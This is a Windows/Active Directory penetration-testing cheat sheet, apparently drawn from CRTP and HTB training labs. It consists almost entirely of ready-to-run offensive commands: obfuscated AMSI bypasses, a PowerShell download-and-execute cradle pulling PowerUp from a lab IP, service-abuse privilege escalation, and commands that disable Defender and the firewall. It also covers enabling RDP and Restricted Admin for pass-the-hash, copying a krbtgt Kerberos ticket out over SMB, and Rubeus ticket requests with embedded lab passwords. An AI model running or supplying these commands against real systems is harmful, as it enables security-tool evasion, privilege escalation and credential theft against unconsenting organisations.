#### AMSI Bypasses ####
1. CRTP Bypass
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

-> Run twice (the first will be detected but it will decimate AMSI so the second one would run perfectly) 
```
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

2. Modern Bypass 1 (2023)
```
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
```

3. Modern Bypass 2 (2023)
```
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

- Download-Execute Cradle
`iex (New-Object Net.WebClient).DownloadString('http://172.16.99.3/PowerUp.ps1')`

#### Local PrivEsc ####
1. Abusing service permissions
`Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose`

2. Abusing unquoted service path
`Write-ServiceBinary -Name 'AbyssWebServer' -Path 'C:\WebServer\Abyss.exe' -UserName 'dcorp\studentx' -Verbose`

3. Abusing service executable (binary) permissions
`Write-ServiceBinary -Name 'AbyssWebServer' -Path 'C:\WebServer\Abyss Web Server\abyssws.exe' -UserName 'dcorp\studentx' -Verbose`

- Disable Defender
`Set-MpPreference -DisableRealtimeMonitoring $true`

- Disable Firewall
`Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False`

- Create a New Inbound Firewall Rule
`New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080`

- Create a New Inbound Firewall Rule
`New-NetFirewallRule -DisplayName "8080-Out" -Direction Outbound -Protocol TCP -Action Allow -LocalPort 8080`

- Enable RDP
`Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' fDenyTSConnections 0`
`Enable-NetFirewallRule -DisplayName 'Remote Desktop - User Mode (TCP-In)'`
`Enable-NetFirewallRule -DisplayName 'Remote Desktop - User Mode (UDP-In)'`

- Enable Restricted Admin Mode to Allow PtH
`reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

- Remote access
`ssh htb-student@10.129.176.110`
`xfreerdp /v:10.129.201.234 /u:htb-student /p:'Academy_student_AD!'
(if xfreerdp is not working → (`apt reinstall freerdp2-x11`)

- Transfer Files via SCP
`scp htb-student@10.129.176.110:/opt/host-enum.txt host-enum.txt`

- Transfer Files via SMB
`impacket-smbserver Docs -smb2support . -user test -password test`
`net use n: \\10.10.14.100\Docs /user:test test`
`copy .\0-40e10000-htb-student@krbtgt~INLANEFREIGHT.LOCAL-INLANEFREIGHT.LOCAL.kirbi \\10.10.14.100\Docs\`

- Launch a PowerShell session on a different computer as a nother user.
`$passwd = ConvertTo-SecureString -AsPlainText -Force -String <PASSWORD>`
`$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Domain\User",$passwd`

- Run commands on a remote computer.
`Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <COMPUTER> -Credential $cred`

- Start an interactive session with a remote computer.
`Enter-PSSession -ComputerName <COMPUTER> -Credential $cred`

- Create a persistent PSSession on a local or remote computer.
`New-PSSession -ComputerName <COMPUTER> -Credential $cred`

#### Rubeus ####
- Create sacrificial process.
`.\Rubeus.exe createnetonly /program:'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' /username:student33 /password:htTz2J72nH9KuAXr /domain:certbulk.cb.corp /show`

- Request a TGT using PKINIT.
`.\Rubeus.exe asktgt /user:certstore /certificate:C:\ADCS\MyTools\Certificates\certstore.pfx /domain:cb.corp /dc:cb-ca.cb.corp /password:Passw0rd! /nowrap /ptt`